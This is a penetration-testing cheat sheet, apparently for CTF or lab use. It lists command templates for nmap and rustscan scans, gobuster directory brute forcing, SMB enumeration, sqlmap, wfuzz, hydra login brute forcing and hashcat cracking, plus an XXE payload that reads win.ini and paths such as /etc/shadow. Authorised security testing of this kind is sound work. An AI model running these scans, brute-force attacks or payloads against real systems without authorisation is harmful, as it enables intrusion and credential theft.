Scanning
========

Rustscan
--------

Scan an IP:
```
rustscan -a $RHOSTS --ulimit 5000 --range 1-65535 -- -oX $PROJECTDIR/nmap.xml -sC
```

Nmap
----

Scan TCP Ports:
```
sudo nmap -sV $RHOSTS -oX $PROJECTDIR/nmap.xml
```
	
Scan TCP ports and run scripts against open ports:
```
sudo nmap -sV -sC $RHOSTS -oX $PROJECTDIR/nmap.xml
```
	
Scan UDP ports and run scripts against open ports:
```
sudo nmap -sU -sC $RHOSTS -oX $PROJECTDIR/nmap-udp.xml
```

nmap ignore firewall
```
sudo nmap -sV -sC -Pn $RHOSTS -oX $PROJECTDIR/nmap.xml
```

Scan for smb vulns
```
sudo nmap --script smb-vuln* -p 445 -oA nmap/smv_vuln $RHOSTS -oX $PROJECTDIR/nmap-smb.xml
```

CURL
----

Send HEAD request to IP:80
```
curl -I http://$RHOST/
```

GoBuster
--------

Quick scan of URL
```
gobuster dir --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --url $RURL --output $PROJECTDIR/gobuster.txt
```

Moderately thurough scan
```
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url $RURL --output $PROJECTDIR/gobuster.txt
```

Scan for PHP paths
```
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -e -s "200,301,302,401" -x "php" -t 100 --url $RURL --output $PROJECTDIR/gobuster.txt
```

Scan a big list of directories
```
gobuster dir --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt --url $RURL --output $PROJECTDIR/gobuster-big.txt
```

Scan common directories
```
gobuster dir --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --url $RURL --output $PROJECTDIR/gobuster-common.txt
```

Scan bit list of files
```
gobuster dir --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt --url $RURL --output $PROJECTDIR/gobuster-raft.txt
```

SMBClient
---------

Identifying open shares with directory listing:
```
while read i; do smbmap -H $i 2>/dev/null; done < <Target IP File> | grep -v Finding | grep -v Authentication
```

Vulnerable XML through external entities
```
Vulnerable XML:
	<!DOCTYPE root [<!ENTITY test SYSTEM "c:/windows/win.ini"> ]>
	...
	&test;
	...
```

Crypto
------

Check a public key
```
openssl rsa -noout -text -inform PEM -in Weak\ RSA/key.pub -pubin
```

Break RSA
```
cd ~/RsaCtfTool
python3 RsaCtfTool.py
```

Understand files
----------------

Discover the type of a file
```
file {filename}
```

Discover file that contains other magic numbers
```
binwalk --signature --term {filename}
```

WPScan
------

```
sudo gem install wpscan
wpscan --url $URL --detection-mode aggressive
```

General Vulnerability Scan
--------------------------
```
nikto --host $URL
```

Useful Linux Paths
------------------

```
/etc/passwd
/etc/shadow
/etc/crontab
```

Bruteforce a login page
-----------------------

[Guide](https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/)

```
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt $RHOST http-post-form "/login.php:username=admin&password=^PASS^:Invalid Username or Password"
---

Reverse a hash
--------------

```
echo "{salt}" > hash
hashcat -a 0 -m 500 hash /usr/share/wordlists/rockyou.txt
```

GDB
---

Check security on a binary
```
checksec $file
```

wfuzz
-----

Fuzz for parameters:
```
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "$RURL?known=param&FUZZ=param" --hh [[EXPECTED CHARS LENGTH]]
```

sqlmap
------

Look for vulnerable payloads by fuzzing a request.  To get `request.txt` submit a form using burpsuite then save the raw request as `request.txt` in `$PROJECTDIR`.
```
sqlmap -r $PROJECTDIR/request.txt --dbs
```

autorecon
---------

```
autorecon $RHOSTS
```